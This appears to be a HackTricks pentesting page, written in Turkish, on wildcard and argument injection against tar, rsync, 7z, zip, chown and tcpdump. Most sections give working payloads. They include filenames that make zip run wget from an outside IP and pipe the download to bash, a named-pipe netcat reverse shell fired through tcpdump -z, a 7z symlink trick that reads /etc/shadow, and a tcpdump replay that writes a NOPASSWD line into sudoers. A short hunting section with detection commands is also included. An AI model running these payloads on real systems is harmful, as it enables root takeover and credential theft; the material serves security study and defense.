# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection**, ayrıcalıklı bir script'in `tar`, `chown`, `rsync`, `zip`, `7z`, … gibi bir Unix binary'sini tırnak içine alınmamış bir wildcard (`*`) ile çalıştırması durumunda meydana gelir.
> Shell, wildcard'ı binary'yi çalıştırmadan **önce** genişlettiği için çalışma dizininde dosya oluşturabilen bir attacker, `-` ile başlayan dosya adları hazırlayabilir; böylece bunlar **veri yerine option** olarak yorumlanır ve rastgele flag'ler, hatta command'ler gizlice aktarılabilir.<sup>[[6]](#references)</sup>
> Bu sayfa, 2023-2025 arasındaki en kullanışlı primitive'leri, güncel araştırmaları ve modern detection yöntemlerini bir araya getirir.

## chown / chmod

Wildcard ile bir option gibi görünen dosya adı genişletildiğinde `--reference` flag'ini kötüye kullanarak **owner/group veya izin bitlerini bir referans dosyasından kopyalayabilirsiniz**.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
root daha sonra şu tür bir şey çalıştırdığında:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Genişletilen `--reference=.drf.php`, açıkça belirtilen owner/mode değerlerini geçersiz kılar; bunun sonucunda eşleşen dosyalar metadata bilgilerini `.drf.php` dosyasından devralır (ve yukarıdaki kurulumla saldırgan tarafından yazılabilir hâle gelir).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>
Ayrıntılar için klasik DefenseCode makalesine de bakın.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

GNU tar'ın **checkpoint** özelliğini ve checkpoint actions özelliğini kötüye kullanarak arbitrary commands çalıştırın.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
`root` örneğin `tar -czf /root/backup.tgz *` komutunu çalıştırdığında, `shell.sh` root olarak yürütülür.<sup>[[10]](#references)</sup>

### bsdtar / macOS sıkıştırıcı override uyarısı

`libarchive` tabanlı güncel macOS'taki varsayılan `tar`, GNU tar'ın `--checkpoint` interface'ini sağlamaz; ancak bsdtar, harici bir sıkıştırıcı seçmek için **--use-compress-program** seçeneğini belgeler.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Privileged bir script `tar -cf backup.tar *` çalıştırdığında bu, kurbanın `PATH` değeri üzerinden `sh` dosyasını seçer ve bsdtar bunu compressor olarak başlatır.<sup>[[11]](#references)</sup> Bu durum option injection'ı kanıtlar; ancak tek başına güvenilir bir arbitrary-command primitive değildir: wildcard ile oluşturulan bir dosya adı `/` içeremez ve bsdtar, saldırgan tarafından seçilmiş bir shell command yerine archive data sağlar. Code execution için ayrıca `PATH` üzerinden çözümlenen veya kullanışlı bir programı adlandırabilen başka bir argument channel aracılığıyla kontrol edilebilen bir executable gerekir.

---

## rsync

`rsync`, `-e` ve `--rsync-path` gibi command-line flag'leri aracılığıyla remote shell'i veya remote binary'yi override etmenize olanak tanır.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Root daha sonra dizini `rsync -az * backup:/srv/` ile arşivlerse, enjekte edilen flag remote-shell mekanizması üzerinden bir shell çalıştırabilir.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Privileged script, option parsing'i durdurmak için wildcard'ın önüne savunma amaçlı olarak `--` eklese bile 7-Zip CLI, dosya adının başına `@` ekleyerek **file list files** kabul eder. Bunu bir symlink ile birleştirmek, *arbitrary files* exfiltrate etmenizi sağlar.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root şuna benzer bir şey çalıştırırsa:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip, `root.txt` dosyasını (→ `/etc/shadow`) bir dosya listesi olarak okumayı deneyecek ve işlemi durdurup **içeriği stderr'e yazdıracaktır**.<sup>[[13]](#references)</sup>

Bu, 7-Zip CLI hem normal dosya adlarını hem de `@listfiles` ifadelerini konumsal girdiler olarak açıkça kabul ettiği için `-- *` ile de çalışır; dolayısıyla `@root.txt` gibi gerçek bir dosya adı yine özel olarak işlenir.<sup>[[13]](#references)</sup>

---

## zip

Bir uygulama, kullanıcı tarafından kontrol edilen dosya adlarını `zip` komutuna (bir wildcard üzerinden veya `--` kullanmadan adları sıralayarak) aktardığında iki oldukça pratik primitive mevcuttur.<sup>[[2]](#references)[[3]](#references)</sup>

- Test hook üzerinden RCE: `-T`, “test archive” özelliğini etkinleştirir ve `-TT <cmd>`, test aracını rastgele bir programla değiştirir (uzun biçimi: `--unzip-command <cmd>`). `-` ile başlayan dosya adlarını enjekte edebiliyorsanız, short-options ayrıştırmasının çalışması için flag'leri farklı dosya adlarına bölün.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notlar
- `'-T -TT <cmd>'` gibi tek bir dosya adı denemeyin — kısa seçenekler karakter başına ayrıştırılır ve işlem başarısız olur. Aşağıda gösterildiği gibi ayrı token'lar kullanın.<sup>[[3]](#references)</sup>
- Uygulama dosya adlarındaki eğik çizgileri kaldırıyorsa, çıplak bir host/IP'den (`/index.html` varsayılan path'tir) alın ve `-O` ile yerel olarak kaydedin, ardından çalıştırın.<sup>[[3]](#references)</sup>
- Token'larınızın nasıl tüketildiğini anlamak için ayrıştırmayı `-sc` (işlenmiş argv'yi gösterir) veya `-h2` (daha fazla help) ile debug edebilirsiniz.<sup>[[3]](#references)</sup>

zip 3.0 üzerindeki yerel davranış örneği.<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Web katmanı `zip` stdout/stderr çıktısını yansıtıyorsa (naive wrapper'larda yaygın), `--help` gibi enjekte edilen flag'ler veya hatalı option'lardan kaynaklanan failures HTTP response içinde görünür; bu da command-line injection'ı doğrular ve payload ayarlamaya yardımcı olur.<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

Privileged bir wrapper, writable bir directory'yi wildcard ile genişlettiğinde, belgelenmiş bu option hook'larını kontrol etmeye değer.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Bir command string'i shell'e iletir |
| `git`   | `-c core.sshCommand=<cmd>` | Git fetch/push için SSH yerine `<cmd>` kullanır |
| `scp`   | `-S <program>` | Alternatif bir SSH-compatible connection program kullanır |

Bu primitives, klasik *tar/rsync/zip* yöntemlerinin ötesinde faydalı kontrollerdir.

---

## Hunting vulnerable wrappers and jobs

Güncel case study'ler ve detection guidance, wildcard/argv injection'ın artık yalnızca bir **cron + tar** problemi olmadığını gösteriyor.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Aynı bug class şu alanlarda da ortaya çıkmaya devam ediyor:

- attacker-controlled upload directory'lerden "everything as zip/tar" indiren web feature'ları
- attacker-controlled filename/filter field'larını açığa çıkaran **tcpdump** wrapper'larına sahip vendor/appliance debug shell'leri
- writable directory'ler üzerinde `tar`, `rsync`, `7z`, `zip`, `chown` veya `chmod` çağıran backup ya da rotation job'ları

Faydalı triage command'ları (`pspy` invocation'ı, belgelenmiş process/file-event ve interval flag'lerini kullanır).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Hızlı sezgisel kurallar:

- `-- *`, birçok GNU aracı için iyi bir çözümdür; ancak `@listfiles` ayrı olarak ayrıştırıldığı için `7z`/`7za` için **değildir**.<sup>[[13]](#references)</sup>
- `zip` için, kullanıcı tarafından kontrol edilen dosya adlarını doğrudan numaralandıran wrapper'ları arayın; kısa seçeneklerin bölünmesi (`-T` + `-TT <cmd>`), shell glob olmasa bile çalışır.<sup>[[2]](#references)[[3]](#references)</sup>
- `tcpdump` için, **output file names**, **rotation settings** veya **capture-file replay** argümanlarını kontrol etmenize izin veren wrapper'lara özellikle dikkat edin.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): wrappers içinde argv injection ile RCE

Kısıtlı bir shell veya vendor wrapper, user-controlled alanları (ör. bir "file name" parametresi) katı quoting/validation uygulamadan birleştirerek `tcpdump` command line oluşturduğunda, fazladan `tcpdump` flag'leri gizlice ekleyebilirsiniz. `-G` (time-based rotation), `-W` (dosya sayısını sınırlar) ve `-z <cmd>` (post-rotate command) birleşimi, `tcpdump`'ı çalıştıran kullanıcı olarak (appliance'larda genellikle root) arbitrary command execution sağlar.<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Ön koşullar:

- `tcpdump`'a aktarılan `argv` değerlerini etkileyebiliyorsunuz (ör. `/debug/tcpdump --filter=... --file-name=<HERE>` gibi bir wrapper aracılığıyla).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper, file name alanındaki boşlukları veya `-` ile başlayan token'ları sanitize etmiyor.<sup>[[4]](#references)</sup>

Klasik PoC (writable bir path'ten reverse shell script'i çalıştırır).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1` her saniye döndürür ve `-W 1` bir rotated file sonrasında durur; capture, rotation gerçekleşmeden önce eşleşen bir packet almalıdır.<sup>[[18]](#references)</sup>
- `-z <cmd>` her rotation sonrasında post-rotate command'ı bir kez çalıştırır ve kapatılan savefile path'ini argüman olarak iletir; script/interpreter argüman işleme biçiminin payload'unuzla eşleştiğinden emin olun.<sup>[[18]](#references)</sup>

No-removable-media varyantları:

- Dosya yazmak için başka bir primitive'iniz varsa (ör. output redirection'a izin veren ayrı bir command wrapper), script'inizi bilinen bir path'e bırakın ve `-z /path/script.sh` tetikleyin; gerekirse script'in kendisi `/bin/sh` çağırmalıdır.<sup>[[18]](#references)</sup>
- Bir vendor wrapper rotated path'i seçmenize izin veriyorsa bu path control'ü yalnızca savefile argümanını yorumlayan bir post-rotate command ile birlikte denetleyin; path control tek başına dosya içeriğini execute etmez.<sup>[[18]](#references)</sup>

---

## sudoers: wildcards/additional args içeren tcpdump → arbitrary write/read ve root

Example sudoers anti-pattern:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
The rule, tcpdump'in documented parser'ında çeşitli seçenekleri kullanılabilir bırakır:<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob'u ve permissive patterns yalnızca ilk `-w` argümanını kısıtlar. `tcpdump` birden fazla `-w` seçeneğini kabul eder; sonuncusu geçerli olur.<sup>[[3]](#references)[[18]](#references)</sup>
- Kural diğer seçenekleri sabitlemez; bu nedenle `-Z`, `-r`, `-V` vb. seçeneklere izin verilir.<sup>[[3]](#references)[[18]](#references)</sup>

İlgili primitives aşağıda belgelenmiştir.<sup>[[3]](#references)[[18]](#references)</sup>
- İkinci bir `-w` ile destination path'i override edin (ilki yalnızca sudoers'ı karşılar).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Kısıtlanmış ağaçtan çıkmak için ilk `-w` içindeki Path traversal.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` ile çıktı sahipliğini zorlayın (her yerde root sahibi dosyalar oluşturur).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` kullanarak hazırlanmış bir PCAP'i yeniden oynatarak rastgele içerik yazma (ör. bir sudoers satırı bırakmak için).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Tam ASCII payload'ını içeren bir PCAP oluşturun ve bunu root olarak yazın</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` ile keyfi dosya okuma/gizli bilgi leak'i (bir savefiles listesi olarak yorumlar). Hata tanılamaları genellikle satırları echo ederek içeriği leak eder.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wildcard Injection yoluyla Potansiyel Shell Tespit Edildi](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Geleceğe Dönüş: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) manual](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) manual](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip command line syntax](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) manual](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` manual](https://man.openbsd.org/scp)
- [18] [tcpdump(8) manual](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
